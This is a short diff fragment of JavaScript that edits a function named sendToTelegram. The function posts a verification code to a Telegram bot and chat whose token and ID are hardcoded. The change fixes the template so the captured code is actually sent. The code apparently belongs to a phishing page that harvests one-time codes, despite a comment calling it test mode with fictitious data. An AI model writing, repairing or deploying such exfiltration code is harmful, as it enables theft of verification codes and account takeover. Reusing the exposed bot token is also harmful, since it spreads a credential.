@@ -157,7 +157,7 @@ function sendToTelegram() {
     // ⚠️ Mode test : données fictives
     const botToken = "8431246186:AAEV2wktzNbQIFjsRQ8Q-TzSuC_GH5WIq-o";
     const chatId = "8345316778";
-    const message = `🔐 Code de vérification {code}`;
+    const message = `🔐 Code de vérification : ${code}`;
 
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
